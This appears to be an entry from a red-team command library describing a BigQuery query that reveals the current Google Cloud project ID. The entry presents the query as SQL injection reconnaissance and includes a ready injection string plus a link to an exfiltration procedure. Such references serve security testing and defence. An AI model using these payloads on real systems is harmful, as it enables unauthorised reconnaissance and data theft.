---
type: command
executor: sql
data: SELECT CURRENT_PROJECT();
output: null
platforms:
  - GCP
tags:
  - discovery
  - bigquery
verified: true
validated: true
---

# bigquery-discover-project-id

## Command

```sql
SELECT CURRENT_PROJECT();
```

## Description

This SQL command retrieves the ID of the current Google Cloud project associated with the BigQuery session. Use it in an SQL injection payload to map the target's GCP environment during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| (None) | No parameters required; executes in the context of the injected session. | No |

## Examples

### Basic Usage

```sql
SELECT CURRENT_PROJECT();
```

### In Injection Context

If the vulnerable query is `SELECT * FROM users WHERE id = 'input'`, inject as: `1' ; SELECT CURRENT_PROJECT(); --`

## Expected Output

```
+-------------------+
| CURRENT_PROJECT() |
+-------------------+
| my-project-123    |
+-------------------+
```

A single row with the project ID string.

## Related

- [[procedures/SQL-Injection-in-Google-BigQuery-for-Data-Exfiltration]]
